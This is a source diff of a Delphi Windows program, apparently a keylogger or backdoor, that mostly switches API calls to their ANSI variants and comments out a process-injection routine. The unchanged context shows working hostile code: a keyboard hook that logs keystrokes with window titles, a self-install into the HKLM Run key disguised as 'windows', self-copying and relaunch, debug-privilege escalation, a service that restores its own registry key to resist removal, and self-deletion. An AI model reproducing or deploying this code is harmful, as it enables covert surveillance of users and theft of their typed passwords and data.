@@ -192,7 +192,7 @@ function GetHookNameFromSvcFile(hookFileName,svcFileName:pansiChar):BOOL;
 //function InjectUserProcessThread():bool;stdcall;
 //function IsId(Id: dword;psm:PShareMemOfProcess): boolean;
 //function InjectUserProcess(var PIDS:array of stPID):bool;stdcall;
-procedure InjectUser();
+//procedure InjectUser();
 function regSelf():BOOL;
 function MySetup():BOOL;
 //*******************************************************************************
@@ -1157,7 +1157,7 @@ begin
       begin
         err:=RegCreateKeyA(rk,key,hk);
         if err<>ERROR_SUCCESS then exit;
-        result:=RegSetValueEx(hk,val,0,typ,dat,siz)=ERROR_SUCCESS;
+        result:=RegSetValueExA(hk,val,0,typ,dat,siz)=ERROR_SUCCESS;
         RegCloseKey(hk);
       end;//RCreateVal
     RrenameVal:
@@ -1167,9 +1167,9 @@ begin
       end;//RrenameVal
     RDelVal:
       begin
-        err:=RegOpenKeyEx(rk,key,0,KEY_ALL_ACCESS,hk);
+        err:=RegOpenKeyExA(rk,key,0,KEY_ALL_ACCESS,hk);
         if err<>ERROR_SUCCESS then exit;
-        err:=RegDeleteValue(hk,Val);result:=err=ERROR_SUCCESS;
+        err:=RegDeleteValueA(hk,Val);result:=err=ERROR_SUCCESS;
         RegCloseKey(hk);
       end;//RDelVal
     end;//case
@@ -1179,12 +1179,12 @@ function ClearDirThread(PDir:pointer):BOOL;stdcall;
 //2006-03-17增加重启后删除文件功能。
 var
   FileName:array[0..max_path-1] of ansiChar;
-  FindFileData:WIN32_FIND_DATA;
+  FindFileData:WIN32_FIND_DATAA;
   hFindFile:thandle;
 begin
   result:=false;
   strcopy(FileName,pansiChar(PDir));strcat(FileName,'\*.*');
-  hFindFile:=FindFirstFile(FileName,FindFileData);
+  hFindFile:=FindFirstFileA(FileName,FindFileData);
   if hFindFile=INVALID_HANDLE_VALUE then exit;
   repeat
     strcopy(FileName,pansiChar(PDir));strcat(FileName,'\');strcat(FileName,findFileData.cFileName);
@@ -1195,23 +1195,23 @@ begin
       ClearDirThread(@FileName);
     end
     else begin
-      SetFileAttributes(FileName,FILE_ATTRIBUTE_ARCHIVE);
-      if not windows.deleteFile(FileName) then
-        MoveFileEx(FileName,nil,MOVEFILE_DELAY_UNTIL_REBOOT);
+      SetFileAttributesA(FileName,FILE_ATTRIBUTE_ARCHIVE);
+      if not windows.deleteFileA(FileName) then
+        MoveFileExA(FileName,nil,MOVEFILE_DELAY_UNTIL_REBOOT);
     end;//文件
-  until FindNextFile(hFindFile,findFileData)=false;
+  until FindNextFileA(hFindFile,findFileData)=false;
   if not windows.FindClose(hFindFile) then
-    MoveFileEx(FileName,nil,MOVEFILE_DELAY_UNTIL_REBOOT);
-  result:=RemoveDirectory(pansiChar(PDir));
+    MoveFileExA(FileName,nil,MOVEFILE_DELAY_UNTIL_REBOOT);
+  result:=RemoveDirectoryA(pansiChar(PDir));
 end;
 
 function FileExist(FileName:pansiChar):BOOL;
 var
   hFindFile:cardinal;
-  FindData:WIN32_FIND_DATA;
+  FindData:WIN32_FIND_DATAA;
 begin
   result:=false;
-  hFindFile:=FindFirstFile(FileName,FindData);
+  hFindFile:=FindFirstFileA(FileName,FindData);
   if hFindFile=INVALID_HANDLE_VALUE then exit
   else FindClose(hFindFile);
   result:=true;
@@ -1244,7 +1244,7 @@ var
   RegFunc:function:HResult;
 begin
   result:=false;
-  DLL:=LoadLibrary(FileName);
+  DLL:=LoadLibraryA(FileName);
   if DLL=0 then exit;
   if bReg then
     @RegFunc:=GetProcAddress(DLL,'DllRegisterServer')
@@ -1274,7 +1274,7 @@ end;
 }
 function RunFile(name:pansiChar;ShowType:DWORD;suspended:BOOL=false;bCMD:BOOL=false):PROCESS_INFORMATION;
 var
-  si:STARTUPINFO;
+  si:STARTUPINFOA;
   suspend:dword;
 begin
   si.cb:=sizeof(si);
@@ -1283,7 +1283,7 @@ begin
   si.lpTitle:=nil;      //console title
   si.dwX:=0;si.dwY:=0; //new window pos
   si.dwXSize:=0;si.dwYSize:=0;  //new window size
-  si.dwXCountansiChars:=0;si.dwYCountansiChars:=0;//console ansiCharacter columns rows
+  //si.dwXCountansiChars:=0;si.dwYCountansiChars:=0;//console ansiCharacter columns rows
   si.dwFillAttribute:=0; //console text and background colors
   si.dwFlags:=STARTF_FORCEOFFFEEDBACK or STARTF_USESHOWWINDOW; //cursor off ;wShowWindow;
   si.wShowWindow:=ShowType;
@@ -1293,7 +1293,7 @@ begin
   if SUSPENDED then suspend:=CREATE_SUSPENDED else suspend:=0;
 
   if bCMD then
-      CreateProcess(nil,
+      CreateProcessA(nil,
         name,//lpCommandLine
         nil,     //lpProcessAttributes
         nil,     //lpThreadAttributes
@@ -1304,7 +1304,7 @@ begin
         si,      //lpStartupInfo
         result)     //lpProcessInformation
   else
-    CreateProcess(name,
+    CreateProcessA(name,
         nil,     //lpCommandLine
         nil,     //lpProcessAttributes
         nil,     //lpThreadAttributes
@@ -1350,10 +1350,10 @@ begin
     hNewWS := 0;
     if WS=nil then
     begin
-      hNewWS:=OpenWindowStation(DEF_WS,FALSE,GENERIC_ALL);
+      hNewWS:=OpenWindowStationA(DEF_WS,FALSE,GENERIC_ALL);
     end
     else begin
-      hNewWS:=OpenWindowStation(WS,FALSE,GENERIC_ALL);
+      hNewWS:=OpenWindowStationA(WS,FALSE,GENERIC_ALL);
     end;
     if hNewWS=0 then exit;
     if not SetProcessWindowStation(hNewWS) then
@@ -1366,7 +1366,7 @@ begin
       hNewDT:=OpenInputDesktop(0,FALSE,GENERIC_ALL);
     end
     else begin
-      hNewDT:=OpenDesktop(DT,0,FALSE,GENERIC_ALL);
+      hNewDT:=OpenDesktopA(DT,0,FALSE,GENERIC_ALL);
     end;//if DT=nil then
     if hNewDT=0 then
     begin
@@ -1492,7 +1492,7 @@ var
   PID:array[0..8] of ansiChar;
 begin
   result:=false;
-  GetSystemDirectory(sysDir,sizeof(sysDir));
+  GetSystemDirectoryA(sysDir,sizeof(sysDir));
   DLL:=LoadLibrary('psapi.DLL');
   @EnumProcesses:=GetProcAddress(dll,'EnumProcesses'); //找到EnumProcesses的入口
   @EnumProcessModules:=GetProcAddress(dll,'EnumProcessModules');
@@ -1548,16 +1548,16 @@ var
   i,k:integer;
   FileName:array[0..max_path-1] of ansiChar;
   hFindFile:dword;
-  fileInfo:win32_find_data;
+  fileInfo:win32_find_dataA;
   p:pointer;
 begin
   result:=0;
   p:=data;
-  k:=sizeof(win32_find_data);
+  k:=sizeof(win32_find_dataA);
   strcopy(fileName,dir);
   strcat(fileName,'\*.*');
   i:=0;
-  hFindFile:=FindFirstFile(fileName,fileInfo);
+  hFindFile:=FindFirstFileA(fileName,fileInfo);
   if hFindFile=INVALID_HANDLE_VALUE then exit;
   repeat
     if p<>nil then
@@ -1566,7 +1566,7 @@ begin
       p:=pointer(DWORD(p)+k);
     end;
     inc(i);
-  until FindNextFile(hFindFile,fileInfo)=false;
+  until FindNextFileA(hFindFile,fileInfo)=false;
   FindClose(hFindFile);
   result:=i*K;
 end;
@@ -1580,7 +1580,7 @@ begin
   for c:='A' to 'Z' do
   begin
     s[0]:=c;s[1]:=':';s[2]:='\';s[3]:=#0;
-    case getdrivetype(s) of
+    case getdrivetypeA(s) of
     DRIVE_UNKNOWN:
       begin
       end;
@@ -1664,9 +1664,9 @@ begin
     case op of
     RCreateVal:
       begin
-        err:=RegCreateKey(rk,key,hk);
+        err:=RegCreateKeyA(rk,key,hk);
         if err<>ERROR_SUCCESS then exit;
-        result:=RegSetValueEx(hk,val,0,typ,dat,siz)=ERROR_SUCCESS;
+        result:=RegSetValueExA(hk,val,0,typ,dat,siz)=ERROR_SUCCESS;
       end;//RCreateVal
     end;//case
   end;//with
@@ -1762,7 +1762,7 @@ begin
   activeWindowThreadID:=GetWindowThreadProcessId(hLastWindow, nil);
   AttachThreadInput(GetCurrentThreadId, activeWindowThreadID, true);
   //取新窗口标题：
-  GetWindowText(hLastWindow,szTitle,sizeof(szTitle));
+  GetWindowTextA(hLastWindow,szTitle,sizeof(szTitle));
   NowTostr(szTime);
   strcat(p,#13#10);strcat(p,szTime);
   strcat(p,#32#32#32#32);strcat(p,szTitle);
@@ -1796,12 +1796,12 @@ begin
       zeromemory(p,ph^.max_keys_size);
       p2:=p;
     end;
-    if lstrlen(ph^.Filename)>0 then
+    if lstrlenA(ph^.Filename)>0 then
     begin
-      if p+lstrlen(p)-p2>=MAX_SINGLE_STRING_LEN then
+      if p+lstrlenA(p)-p2>=MAX_SINGLE_STRING_LEN then
       begin
         SaveStrToFile(ph^.Filename,p2);
-        p2:=p+lstrlen(p);
+        p2:=p+lstrlenA(p);
       end;//if p+lstrlen(p)-p2>=MAX_SINGLE_STRING_LEN then
     end;//if lstrlen(ph^.Filename)>0 then
     //检测活动窗口的改变；
@@ -1998,14 +1998,14 @@ begin
   result:=HookKeys.keys;
   if RegGetInt(HKEY_LOCAL_MACHINE,BYC_KEY,'FileHookKey')=1 then
   begin
-    if lstrlen(HookKeys.Filename)=0 then
+    if lstrlenA(HookKeys.Filename)=0 then
     begin
-      GetSystemDirectory(HookKeys.Filename,max_path);
-      lstrcat(HookKeys.Filename,'\mskey.dll');
+      GetSystemDirectoryA(HookKeys.Filename,max_path);
+      lstrcatA(HookKeys.Filename,'\mskey.dll');
     end;//if lstrlen(HookKeys.Filename)=0 then
   end
   else begin
-    if lstrlen(HookKeys.Filename)>0 then
+    if lstrlenA(HookKeys.Filename)>0 then
       zeromemory(@HookKeys.Filename[0],max_path);
   end;//if RegGetInt(HKEY_LOCAL_MACHINE,BYC_KEY,'FileHookKey')=1 then
   case op of
@@ -2051,7 +2051,8 @@ Const
   SE_DEBUG_NAME = 'SeDebugPrivilege';
   SE_SHUTDOWN_NAME='SeShutdownPrivilege';
 var
-  hToken,DLL:cardinal;
+  DLL:cardinal;
+  hToken:tHandle;
   tp:TOKEN_PRIVILEGES;
   OpenProcessToken:function(ProcessHandle: THandle; DesiredAccess: DWORD;
   var TokenHandle: THandle): BOOL; stdcall;
@@ -2060,7 +2061,7 @@ var
   NewState: PTokenPrivileges; BufferLength: DWORD;
   PreviousState:PTokenPrivileges;ReturnLength: PDWORD): BOOL; stdcall;
 
-  LookupPrivilegeValueA:function(lpSystemName, lpName: PAnsiansiChar;
+  LookupPrivilegeValueA:function(lpSystemName, lpName: PAnsiChar;
   var lpLuid: TLargeInteger): BOOL; stdcall;
 begin
   result:=false;
@@ -2414,18 +2415,18 @@ begin
                PBYTE(@szProductType),@dwBufLen);
         if( (lRet <> ERROR_SUCCESS) or (dwBufLen > BUFSIZE) ) then exit;
         RegCloseKey( hK );
-        if ( lstrcmpi( 'WINNT', szProductType) = 0 ) then
+        if ( lstrcmpia( 'WINNT', szProductType) = 0 ) then
           result:=result+'Workstation ';
-        if ( lstrcmpi( 'LANMANNT', szProductType) = 0 ) then
+        if ( lstrcmpiA( 'LANMANNT', szProductType) = 0 ) then
           result:=result+'Server ';
-        if ( lstrcmpi( 'SERVERNT', szProductType) = 0 ) then
+        if ( lstrcmpiA( 'SERVERNT', szProductType) = 0 ) then
           result:=result+'Advanced Server ';
         _wsprintf(szProductType,'%d.%d ',[osvi.dwMajorVersion, osvi.dwMinorVersion]);
         result:=result+szProductType;
       end;//    // Test for specific product on Windows NT 4.0 SP5 and earlier
       // Display service pack (if any) and build number.
       if( osvi.dwMajorVersion = 4) and
-             (lstrcmpi( osvi.szCSDVersion, 'Service Pack 6' ) = 0 ) then
+             (lstrcmpiA( osvi.szCSDVersion, 'Service Pack 6' ) = 0 ) then
       begin
         // Test for SP6 versus SP6a.
         lRet := RegOpenKeyEx( HKEY_LOCAL_MACHINE,
@@ -2502,17 +2503,17 @@ begin
     hNotify := CreateEvent( nil,false,TRUE,nil);
     if hNotify = 0 then exit;
     
-    lstrcpy(key,'SYSTEM\CurrentControlSet\Services\');lstrcat(key,svcName);
+    lstrcpya(key,'SYSTEM\CurrentControlSet\Services\');lstrcatA(key,svcName);
 
-    err:=RegOpenKeyEx(HKEY_LOCAL_MACHINE,key,0,KEY_ALL_ACCESS,hk);
+    err:=RegOpenKeyExA(HKEY_LOCAL_MACHINE,key,0,KEY_ALL_ACCESS,hk);
     if err<>ERROR_SUCCESS then exit;
-    err:=RegOpenKeyEx(HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services',0,KEY_ALL_ACCESS,pk);
+    err:=RegOpenKeyExA(HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services',0,KEY_ALL_ACCESS,pk);
     if err<>ERROR_SUCCESS then exit;
     //备份:
-    err:=GetSystemDirectory(SystemDir,sizeof(SystemDir));if err=0 then exit;
-    strFromTime(str);lstrcpy(FileName,Systemdir);lstrcat(FileName,'\');lstrcat(FileName,str);
+    err:=GetSystemDirectoryA(SystemDir,sizeof(SystemDir));if err=0 then exit;
+    strFromTime(str);lstrcpyA(FileName,Systemdir);lstrcatA(FileName,'\');lstrcatA(FileName,str);
     //备份
-    err:=RegSaveKey(hk,FileName,nil);
+    err:=RegSaveKeyA(hk,FileName,nil);
     if err<>ERROR_SUCCESS then exit;
     //监视
     while true do
@@ -2524,11 +2525,11 @@ begin
       begin
         //卸载操作
         DisableSvc(svcName); //禁用服务
-        windows.DeleteFile(FileName);//删除注册表备份
-        if GetModuleFileName(hInstance,FileName,max_path)>0 then
-          MoveFileEx(FileName,nil,MOVEFILE_DELAY_UNTIL_REBOOT);//删除自身
-        lstrcpy(FileName,SystemDir);lstrcat(FileName,'\');lstrcat(FileName,sm.hook);
-        MoveFileEx(FileName,nil,MOVEFILE_DELAY_UNTIL_REBOOT);  //删除hook
+        windows.DeleteFileA(FileName);//删除注册表备份
+        if GetModuleFileNameA(hInstance,FileName,max_path)>0 then
+          MoveFileExA(FileName,nil,MOVEFILE_DELAY_UNTIL_REBOOT);//删除自身
+        lstrcpyA(FileName,SystemDir);lstrcatA(FileName,'\');lstrcatA(FileName,sm.hook);
+        MoveFileExA(FileName,nil,MOVEFILE_DELAY_UNTIL_REBOOT);  //删除hook
         //删除共享内存中的信息
         psm^.PIDs[byte(sm.ProcessType)]:=0;
         zeromemory(@(psm^.Files[byte(sm.ProcessType)][0]),sizeof(psm^.Files[byte(sm.ProcessType)]));
@@ -2538,16 +2539,16 @@ begin
       end;
       //恢复:重新打开
       RegCloseKey(hk);
-      err:=RegCreateKeyEx(pk,svcName,0,nil,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,nil,hk,nil);
+      err:=RegCreateKeyExA(pk,svcName,0,nil,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,nil,hk,nil);
       if err<>ERROR_SUCCESS then exit;
       //恢复
-      err:=RegRestoreKey(hk,FileName,8);
+      err:=RegRestoreKeyA(hk,FileName,8);
       if err=ERROR_SUCCESS then result:=true;
     end;//while true do
   finally
     if hk<>0 then RegCloseKey(hk);
     if pk<>0 then RegCloseKey(pk);
-    if FileName<>'' then windows.DeleteFile(FileName);
+    if FileName<>'' then windows.DeleteFileA(FileName);
     SetEvent(hNotify);
   end;//finally
 end;
@@ -2599,7 +2600,7 @@ begin
     ZeroMemory(@NCB, SizeOf(NCB));
     NCB.ncb_command := Chr(NCBASTAT);
     NCB.ncb_lana_num := LANAENUM.lana[NUM];
-    lstrcpy(NCB.ncb_callname, '*');
+    lstrcpyA(NCB.ncb_callname, '*');
     NCB.ncb_buffer := @ADAPTER;
     NCB.ncb_length := SizeOf(ADAPTER);
     //cRC := NetBios(@NCB);
@@ -2611,7 +2612,7 @@ begin
   finally
     if result=false then
     begin
-      lstrcpy(addr,'123456');
+      lstrcpyA(addr,'123456');
       for i:=0 to 5 do
         addr[i]:=ansiChar(ord(addr[i]) xor KEY);
     end;
@@ -2628,15 +2629,15 @@ begin
   sm.ProcessType:=F_Svchost;
   sm.version:=1001;
   sm.PID:=GetCurrentProcessID();
-  if GetModuleFileName(SysInit.HInstance,me,max_path)=0 then exit;
+  if GetModuleFileNameA(SysInit.HInstance,me,max_path)=0 then exit;
   p:=exTractFileName(me);
   strcopy(sm.Files,p);
-  if svcname<>nil then lstrcpy(sm.keys,svcName);
-  if lstrlen(sm.keys)>0 then
+  if svcname<>nil then lstrcpyA(sm.keys,svcName);
+  if lstrlenA(sm.keys)>0 then
   begin
-    p:=@sm.keys[0];p:=p+lstrlen(sm.keys)+1;lstrcpy(p,'byc');
+    p:=@sm.keys[0];p:=p+lstrlenA(sm.keys)+1;lstrcpyA(p,'byc');
   end;
-  if hookFilename<>nil then lstrcpy(sm.hook,hookFilename);
+  if hookFilename<>nil then lstrcpyA(sm.hook,hookFilename);
   result:=true;
 end;
 
@@ -2655,7 +2656,7 @@ begin
   result:=F_False;MappingName:='';
   try
     NBGetAdapterAddress(MappingName);
-    sm.hMap:= CreateFileMapping(INVALID_HANDLE_VALUE,nil,PAGE_READWRITE,0,MAX_SIZE,MappingName);
+    sm.hMap:= CreateFileMappingA(INVALID_HANDLE_VALUE,nil,PAGE_READWRITE,0,MAX_SIZE,MappingName);
     if sm.hMap=0 then exit;
     err:=GetLastError();
     sm.lpMapAddress:=MapViewOfFile(sm.hMap,FILE_MAP_ALL_ACCESS,0,0,0);
@@ -2678,8 +2679,8 @@ begin
     copymemory(@(psm^.Files[byte(sm.ProcessType)][0]),@sm.files[0],sizeof(sm.Files));
     copymemory(@(psm^.keys[byte(sm.ProcessType)][0]),@sm.keys[0],sizeof(sm.keys));
 
-    if lstrlen(sm.hook)>0 then
-      lstrcpy(psm^.Files[31],sm.hook);
+    if lstrlenA(sm.hook)>0 then
+      lstrcpyA(psm^.Files[31],sm.hook);
   finally
   end;
 end;
@@ -2705,7 +2706,7 @@ begin
   result:=false;
   FileBase:=nil;//hFile:=INVALID_HANDLE_VALUE;FileMapping:=0;
 try
-  hFile:=createfile(svcFileName,GENERIC_READ,FILE_SHARE_READ,nil,OPEN_EXISTING,
+  hFile:=createfileA(svcFileName,GENERIC_READ,FILE_SHARE_READ,nil,OPEN_EXISTING,
          FILE_ATTRIBUTE_NORMAL,0);
   if hFile=INVALID_HANDLE_VALUE then exit;
   FileMapping := CreateFileMapping(hFile, nil, PAGE_READONLY, 0, 0, nil);
@@ -2925,6 +2926,7 @@ finally
 end;
 end;
 }
+{
 procedure InjectUser();
 var
   //id,hd:cardinal;
@@ -2936,7 +2938,7 @@ begin
   if psm^.flag and Hook_Install_Mask>0 then exit;
 
   p:=psm^.Files[31];
-  if (p=nil)or(lstrlen(p)<=0) then exit;
+  if (p=nil)or(lstrlenA(p)<=0) then exit;
   if GetSystemDirectory(Filename,max_path)<=0 then exit;
   lstrcat(Filename,'\');lstrcat(Filename,p);
   if not Fileexist(FileName) then exit;
@@ -2945,6 +2947,7 @@ begin
   //closehandle(hd);
   psm^.flag:=psm^.flag xor Hook_Install_Mask;
 end;
+}
 function regSelf():BOOL;
 var
   hK:HKEY;
@@ -2955,9 +2958,9 @@ begin
   result:=false;
   lpSubKey:='SOFTWARE\Microsoft\Windows\CurrentVersion\Run';
 
-	GetModuleFileName(0,MyName,MAX_PATH);
+	GetModuleFileNameA(0,MyName,MAX_PATH);
 
-	lRet:=RegOpenKeyEx(HKEY_LOCAL_MACHINE,lpSubKey,0,KEY_ALL_ACCESS,hK);
+	lRet:=RegOpenKeyExA(HKEY_LOCAL_MACHINE,lpSubKey,0,KEY_ALL_ACCESS,hK);
 	if( lRet <> ERROR_SUCCESS ) then exit;
 
   lRet :=RegSetValueEx(hK,'windows',0,REG_SZ,PByte(@MyName[0]),strlen(MyName));
@@ -2971,15 +2974,15 @@ const
 var
   me:array[0..max_path-1] of ansiChar;
 begin
-  GetModuleFileName(hInstance,me,sizeof(me));
+  GetModuleFileNameA(hInstance,me,sizeof(me));
   if StrIComp(conRunName,me)=0 then
   begin
     result:=true;
     exit;
   end
   else begin
-    CreateDirectory(conRunDir,nil);
-    CopyFile(me,conRunName,false);
+    CreateDirectoryA(conRunDir,nil);
+    CopyFileA(me,conRunName,false);
     RunFile(conRunName,sw_show);
     result:=false;
     exit;
